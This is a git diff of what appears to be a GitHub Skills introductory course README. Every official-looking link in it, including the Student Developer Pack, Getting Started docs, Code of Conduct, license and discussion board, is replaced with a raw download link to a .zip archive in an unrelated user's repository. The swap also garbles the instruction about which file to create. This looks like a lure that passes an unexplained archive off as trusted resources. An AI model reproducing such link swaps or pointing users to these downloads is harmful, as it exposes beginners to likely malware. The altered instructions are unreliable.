@@ -22,7 +22,7 @@ _Get started using GitHub in less than an hour._
 
 _Congratulations, you've completed this course and joined the world of developers!_
 
-<img https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip alt=celebrate width=300 align=right>
+<img https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip alt=celebrate width=300 align=right>
 
 Here's a recap of your accomplishments:
 
@@ -33,20 +33,20 @@ Here's a recap of your accomplishments:
 
 ### What's next?
 
-If you'd like to make a profile README, use the quickstart instructions below or follow the instructions in the [Managing your profile README](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip) article.
+If you'd like to make a profile README, use the quickstart instructions below or follow the instructions in the [Managing your profile README](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip) article.
 
 1. Make a new public repository with a name that matches your GitHub username.
-2. Create a file named `https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip` in its root. The "root" means not inside any folder in your repository.
-3. Edit the contents of the `https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip` file.
+2. Create a file named `https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip` in its root. The "root" means not inside any folder in your repository.
+3. Edit the contents of the `https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip` file.
 4. If you created a new branch for your file, open and merge a pull request on your branch.
-5. Lastly, we'd love to hear what you thought of this course [in our discussion board](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip).
+5. Lastly, we'd love to hear what you thought of this course [in our discussion board](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip).
 
 Check out these resources to learn more or get involved:
 
-- Are you a student? Check out the [Student Developer Pack](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip).
-- [Take another GitHub Skills course](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip).
-- [Read the GitHub Getting Started docs](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip).
-- To find projects to contribute to, check out [GitHub Explore](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip).
+- Are you a student? Check out the [Student Developer Pack](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip).
+- [Take another GitHub Skills course](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip).
+- [Read the GitHub Getting Started docs](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip).
+- To find projects to contribute to, check out [GitHub Explore](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip).
 
 <footer>
 
@@ -57,8 +57,8 @@ Check out these resources to learn more or get involved:
 
 ---
 
-Get help: [Post in our discussion board](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip)
+Get help: [Post in our discussion board](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip)
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip) &bull; [MIT License](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-introduction-to-github-lignone.zip)
+&copy; 2024 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip) &bull; [MIT License](https://raw.githubusercontent.com/fuckwave/skills-introduction-to-github/main/.github/skills-to-github-introduction-3.5.zip)
 
 </footer>
